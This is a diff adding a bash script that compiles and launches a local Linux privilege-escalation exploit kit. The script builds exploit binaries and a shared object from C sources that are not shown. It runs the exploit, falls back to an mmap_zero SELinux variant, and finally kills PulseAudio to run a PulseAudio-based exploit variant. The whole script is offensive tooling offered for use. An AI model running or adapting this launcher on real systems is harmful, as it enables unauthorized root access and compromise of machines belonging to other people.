@@ -1,0 +1,58 @@
+#!/usr/bin/env bash
+
+EXPLOIT=./exploit
+EXPLOIT_PULSEAUDIO=./exploit-pulseaudio
+GCC=/usr/bin/gcc
+
+if [ -x $GCC ]; then
+	if [ -x $EXPLOIT ]; then
+		rm -f $EXPLOIT
+	fi
+
+	if [ -x $EXPLOIT_PULSEAUDIO ]; then
+		rm -f $EXPLOIT_PULSEAUDIO
+	fi
+
+	if [ -x $EXPLOIT.so ]; then
+		rm -f $EXPLOIT.so
+	fi
+
+	MACHINE=$(uname -m)
+
+	if [ "$MACHINE" = "x86_64" -o "$MACHINE" = "ppc64" ]; then
+		$GCC -Wall -m64 -o $EXPLOIT $EXPLOIT.c
+		$GCC -Wall -m64 -o $EXPLOIT_PULSEAUDIO $EXPLOIT_PULSEAUDIO.c
+		$GCC -Wall -fPIC -m64 -shared -o $EXPLOIT.so $EXPLOIT.c
+	else
+		$GCC -Wall -o $EXPLOIT $EXPLOIT.c
+		$GCC -Wall -o $EXPLOIT_PULSEAUDIO $EXPLOIT_PULSEAUDIO.c
+		$GCC -Wall -fPIC -shared -o $EXPLOIT.so $EXPLOIT.c
+	fi
+
+	if [ -x $EXPLOIT ]; then
+		$EXPLOIT
+
+		if [ $? -eq 0 ]; then
+			exit
+		fi
+
+		source ./runcon-mmap_zero
+	fi
+
+	if [ -x $EXPLOIT_PULSEAUDIO ]; then
+		if [ -e $EXPLOIT.so ]; then
+			PULSEAUDIO=/usr/bin/pulseaudio
+
+			if [ -x $PULSEAUDIO ]; then
+				$PULSEAUDIO -k &> /dev/null
+				$PULSEAUDIO --check &> /dev/null
+
+				if [ $? -eq 0 ]; then
+					kill -9 $(pidof pulseaudio)
+				fi
+
+				$EXPLOIT_PULSEAUDIO $PWD/$EXPLOIT
+			fi
+		fi
+	fi
+fi
